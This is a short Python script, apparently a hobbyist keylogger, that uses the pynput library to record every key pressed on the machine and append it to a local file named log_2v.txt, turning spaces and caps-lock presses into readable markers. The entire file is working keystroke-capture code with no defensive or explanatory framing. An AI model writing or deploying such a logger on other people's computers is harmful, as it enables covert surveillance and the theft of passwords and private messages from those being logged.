from pynput.keyboard import Listener

def listener_teclado(key):
    letter = str(key)
    letter = letter.replace("'","")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.caps_lock':
        letter = ' E.U.M ->'    
    with open ("log_2v.txt", 'a') as f:
        f.write(letter)
    
    
with Listener(on_press = listener_teclado) as l:
    l.join()    
